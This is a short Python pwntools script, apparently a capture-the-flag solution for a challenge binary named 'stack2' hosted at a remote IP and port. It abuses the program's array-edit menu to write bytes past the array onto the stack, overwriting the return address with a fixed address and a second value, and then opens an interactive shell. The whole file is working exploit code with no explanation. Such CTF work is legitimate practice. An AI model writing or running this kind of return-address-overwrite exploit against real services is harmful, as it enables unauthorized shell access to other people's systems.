from pwn import *

#n = process('./stack2')
n = remote('111.198.29.45',41658)
offset = 0x84

n.recvuntil('have:')
n.sendline('1')
n.recvuntil('numbers')
n.sendline('1')
n.recvuntil('5. exit')

def write(addr,value):
	n.sendline('3')
	n.recvuntil('change:')
	n.sendline(str(addr))
	n.recvuntil('number:')
	n.sendline(str(value))
	n.recvuntil('5. exit')

write(offset,0x50)
write(offset + 1,0x84)
write(offset + 2,0x04)
write(offset + 3,0x08)

offset += 8

write(offset,0x87)
write(offset + 1,0x89)
write(offset + 2,0x04)
write(offset + 3,0x08)
n.sendline('5')
n.interactive()
